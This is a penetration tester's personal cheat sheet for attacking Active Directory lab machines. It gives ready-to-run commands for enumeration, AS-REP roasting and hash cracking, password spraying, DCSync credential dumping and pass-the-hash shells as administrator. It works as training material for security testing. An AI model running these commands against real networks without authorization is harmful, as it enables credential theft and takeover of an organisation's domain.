# AD Enumeration Methodology — Personal Notes

**By Stager** | FashilHack

---

These are my personal enumeration methodology notes built from working through AD machines. The goal is a clear checklist that covers everything so I always know what to try and when to move on.

---

## Why This Methodology Matters

The point of running all these checks is not to run every tool blindly — it's to have a structured approach so that when one path is closed you move to the next without guessing. Every check has a reason. When something works you follow it. When nothing works you still know you covered all the bases.

---

## Phase 1 — Network and Service Discovery

```bash
# Full port scan with service detection
nmap -A -p- -T5 -Pn <target> -v

# Save output
nmap -sC -sV -oA nmap/machine <target>
```

**What you're looking for:**
- Port 88 (Kerberos) + 389 (LDAP) = Domain Controller confirmed
- Port 5985 (WinRM) = potential shell access if you get creds
- Port 80/443 = web app worth checking for employee names
- Port 445 (SMB) = shares to check
- Port 53 (DNS) = zone transfer worth trying
- Port 1433 (MSSQL) = SQL server to abuse if you get creds

**Add to /etc/hosts:**
```bash
echo "10.10.10.1 dc01.domain.htb domain.htb dc01" >> /etc/hosts
```

---

## Phase 2 — Web Recon (if web server present)

```bash
dirb http://domain.htb
gobuster dir -u http://domain.htb -w /usr/share/wordlists/directory-list-2.3-medium.txt
```

**Manually browse:**
- Team/About/Employee pages → employee names
- Page source comments → usernames, emails, hints
- Check `robots.txt` and `sitemap.xml`

Save any names found to `names.txt`.

---

## Phase 3 — Anonymous Access Enumeration

Run all of these before assuming you need credentials. Old domains and misconfigured environments allow anonymous access to a lot.

**SMB:**
```bash
netexec smb <target>
netexec smb <target> -u "" -p "" --shares
netexec smb <target> -u "" -p "" --rid-brute
netexec smb <target> -u "guest" -p "" --rid-brute
smbmap -H <target>
smbclient -N -L //<target>
```

**LDAP:**
```bash
netexec ldap <target> -u "" -p "" --users
ldapsearch -H ldap://<target> -x -s base namingcontext
ldapsearch -H ldap://<target> -x -b "DC=domain,DC=htb" '(objectClass=)' 'sAMAccountName' | grep sAMAccountName
nmap -n -sV --script "ldap* and not brute" -p 389 <target>
```

**RPC:**
```bash
rpcclient -U "" -N <target>
# Inside:
enumdomusers
queryusergroups <rid>
querygroup <rid>
queryuser <rid>
```

**AD Certificate Services:**
```bash
certipy-ad find -u "" -p "" -dc-ip <target> -vulnerable
```

**enum4linux:**
```bash
enum4linux -a <target>
```

**DNS:**
```bash
dnsrecon -d domain.htb -n <target>
dig domain.htb @<target> axfr
```

**What anonymous access tells you:**
- Users = targets for AS-REP Roasting and password spraying
- Shares = potential files with credentials
- RID brute = users even when LDAP is locked down
- DNS zone transfer = full internal DNS map

---

## Phase 4 — Username Generation and Validation

When you have real names but no usernames:

```bash
# Generate all common username formats
username-anarchy -i names.txt > generated_users.txt

# Alternative Python tool
python3 username-generate.py -u names.txt -o generated_users.txt
```

Validate which usernames actually exist:

```bash
kerbrute userenum generated_users.txt --dc <target> -d domain.htb
```

Kerbrute is fast and tells you:
- Which usernames are valid
- Which accounts have pre-auth disabled (AS-REP Roastable) — dumps the hash immediately

---

## Phase 5 — AS-REP Roasting

Works when you have valid usernames and some accounts have pre-authentication disabled.

**With kerbrute (checks all users at once):**
```bash
kerbrute userenum users.txt --dc <target> -d domain.htb
```

**With impacket (one user at a time, more control):**
```bash
impacket-GetNPUsers -dc-ip <target> domain.htb/username -no-pass
impacket-GetNPUsers -dc-ip <target> -request 'domain.htb/' -format hashcat
```

**If hash comes back as AES ($18) — downgrade to RC4:**
```bash
kerbrute userenum users.txt --dc <target> -d domain.htb --downgrade
```
AES hashes ($18) cannot be cracked by hashcat. RC4 hashes ($23 / 18200) can.

**Crack the hash:**
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 6 — Password Spraying

When you have passwords but aren't sure which accounts they work on.

**Always check password policy first to avoid lockouts:**
```bash
netexec smb <target> --pass-pol
crackmapexec smb <target> --pass-pol
```

**Spray with NTLM:**
```bash
netexec smb <target> -u users.txt -p passwords.txt --continue-on-success
```

**Spray with Kerberos (use when NTLM is disabled on accounts):**
```bash
netexec smb <target> -k -u users.txt -p passwords.txt --continue-on-success
```

If you get "account restriction" when using normal login → try adding `-k` for Kerberos authentication. Some accounts have NTLM disabled.

---

## Phase 7 — Post-Shell Enumeration (Windows)

Once you have a shell via Evil-WinRM:

**Upload WinPEAS:**
```bash
upload winpeas.exe
.\winpeas.exe
```

**Key WinPEAS sections to check:**
- AutoLogon credentials → plaintext passwords in registry
- Unquoted service paths → potential service hijacking
- Weak service permissions → modify and restart for SYSTEM
- Interesting files → config files with credentials
- Scheduled tasks → writable tasks running as SYSTEM

**Upload SharpHound for BloodHound:**
```bash
upload SharpHound.exe
.\SharpHound.exe
download <zipfile>
```

**Check privileges manually:**
```bash
whoami /all
net user username /domain
net localgroup administrators
```

---

## Phase 8 — BloodHound Analysis

```bash
sudo neo4j console
bloodhound --no-sandbox
# or new version:
cd /opt/bloodhound/server && docker compose up -d
# browse to localhost:8088
```

**Key queries to always run:**
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Shortest Path from Owned Objects
- Users with Most Local Admin Rights
- Find AS-REP Roastable Users
- Find Kerberoastable Users

**Reading BloodHound edges:**
- Orange/red edges = exploitable right now
- Green edges = informational
- Yellow + yellow with no path = nothing there, move on

**Always mark owned accounts** before running path queries — BloodHound uses owned nodes as starting points.

---

## Phase 9 — DCSync and Pass the Hash

**DCSync (dump all domain hashes):**
```bash
impacket-secretsdump domain.htb/username:password@<target>
impacket-secretsdump 'username:password@<target>'
```

Save all output. Important hashes:
- Administrator NTLM hash → Pass-the-Hash for full access
- krbtgt NTLM hash → Golden Ticket attacks

**Pass the Hash:**
```bash
# Check if it works
netexec smb <target> -u administrator -H <ntlm_hash>

# Get shell
impacket-psexec domain.htb/administrator@<target> -hashes aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
impacket-wmiexec 'administrator:<ntlm_hash>@<target>'
evil-winrm -i <target> -u administrator -H <ntlm_hash>
```

**Hash format for psexec:**
```
aad3b435b51404eeaad3b435b51404ee:YOUR_NTLM_HASH_HERE
```
The first part (aad3b...) is the empty LM hash — always the same on modern Windows. Your actual hash goes after the colon.

psexec = SYSTEM shell
wmiexec = user shell (administrator)
evil-winrm = user shell (administrator)

---

## Netexec vs CrackMapExec

Netexec (nxc) is the actively maintained successor to CrackMapExec (cme/crackmapexec). Same syntax, same features, actively updated. Use netexec going forward.

```bash
# Same command, different tool name:
crackmapexec smb <target> -u user -p pass
netexec smb <target> -u user -p pass
```

---

## Quick Reference — AD Enumeration Checklist

```
□ nmap full scan → identify all open ports
□ Add DC to /etc/hosts
□ Web server → scrape employee names
□ SMB anonymous → shares, rid-brute
□ LDAP anonymous → users
□ RPC anonymous → enumdomusers
□ DNS → zone transfer
□ enum4linux → catch anything missed
□ certipy → check for vulnerable cert templates
□ Generate usernames → username-anarchy
□ Kerbrute → validate users + AS-REP check
□ AS-REP Roast → impacket-GetNPUsers
□ Crack hashes → hashcat -m 18200
□ Password spray → netexec (check policy first)
□ Evil-WinRM → shell
□ WinPEAS → AutoLogon, services, tasks
□ SharpHound → BloodHound data
□ BloodHound → attack paths
□ DCSync → secretsdump
□ Pass-the-Hash → psexec/wmiexec
```

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._